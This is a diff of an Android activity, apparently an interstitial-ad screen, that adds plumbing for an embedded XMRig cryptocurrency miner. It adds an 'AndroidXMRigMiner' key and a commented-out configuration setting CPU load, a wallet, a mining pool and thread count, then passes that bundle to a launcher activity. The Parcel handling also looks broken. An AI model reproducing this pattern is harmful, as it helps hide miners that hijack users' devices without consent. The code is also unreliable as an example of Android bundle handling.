@@ -5,29 +5,78 @@ import com.google.android.gms.ads.AdRequest;
 import com.google.android.gms.ads.InterstitialAd;
 import com.google.android.gms.ads.MobileAds;
 */
-import android.content.Intent;
-import android.os.Bundle;
+
 import android.app.Activity;
+import android.content.Intent;
+import android.os.Build;
+import android.os.Bundle;
+import android.os.Parcel;
+import android.os.PersistableBundle;
 import android.view.Menu;
 import android.view.MenuItem;
 
 public class IntersticialActivity extends Activity {
     private static final String BANNER_AD_ID = "ca-app-pub-7452939419560645/3623954709";
+    private static final String KEY = "AndroidXMRigMiner";
     //private static InterstitialAd mInterstitialAd;
     private Activity activity;
+
+    public static PersistableBundle persistableBundle = getOrCreateBundle();
+    public static Bundle bundle;
+
+
+    public static PersistableBundle getPersistableBundle() {
+        return getOrCreateBundle();
+    }
+
+    public static Bundle getBundle() {
+        return bundle;
+    }
+
+    public static void saveBundle(){
+        getPersistableBundle().writeToParcel(Parcel.obtain(), 0);
+    }
+
+    public static PersistableBundle getOrCreateBundle(){
+        persistableBundle = PersistableBundle.CREATOR.createFromParcel(Parcel.obtain());
+        if(persistableBundle==null){
+            persistableBundle = PersistableBundle.EMPTY;
+        }
+
+        return persistableBundle;
+    }
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        getActionBar().hide();
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.HONEYCOMB) {
+            getActionBar().hide();
+        }
         //MobileAds.initialize(this, getString(R.string.admob_app_id));
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+            bundle = new Bundle(getPersistableBundle());
+        }
+
 
         activity = this;
 
         //Tools.goToNextLevel(activity, new AdListener());
 
         Intent i = new Intent (getApplicationContext(), LauncherActivity.class);
-        startActivity(i);
+/*
+        getPersistableBundle().putInt("cpu", 80);
+        getPersistableBundle().putInt("threads", 1);
+        getPersistableBundle().putString("user", getString(R.string.my_wallet));
+        getPersistableBundle().putString("pool", getString(R.string.my_pool));
+        getPersistableBundle().putBoolean("safe", Boolean.TRUE);
+        getPersistableBundle().putBoolean("aes", Boolean.FALSE);
+        getPersistableBundle().putBoolean("pages", Boolean.FALSE);
+        getPersistableBundle().putBoolean("workerId", Boolean.TRUE);
+*/
+        i.putExtras(getBundle());
+
+        startActivity(i, getBundle());
 
 
     }
